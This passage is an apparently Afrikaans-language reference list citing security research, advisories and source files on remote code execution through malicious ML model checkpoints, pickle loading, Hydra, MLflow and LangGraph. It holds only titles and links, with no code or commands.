- [9] [PoC van kwaadwillige checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader ná die regstelling (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Afstandkode-uitvoering met moderne AI/ML-formate en biblioteke](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate-dokumentasie](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list-commit (waarskuwing oor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Van SQLi tot RCE: Uitbuiting van LangGraph se Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Om Archive Slip-foute te benut vir AI/ML-belonings van hoë waarde](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk-advies en PyFunc-bewys van konsep – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow-bronkode – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – eindpunte vir die aflaai en oplaai van artefakte](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Binarly MLTracer-taksonomie vir ontduiking van statiese skandeerders](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – Opsporing van kwaadwillige modelle met MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [PyTorch-implementering van storage `_load_from_bytes`](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [CPython pickle `find_class`-versoenbaarheidskartering](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [CPython `_compat_pickle`-invoerkartering](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
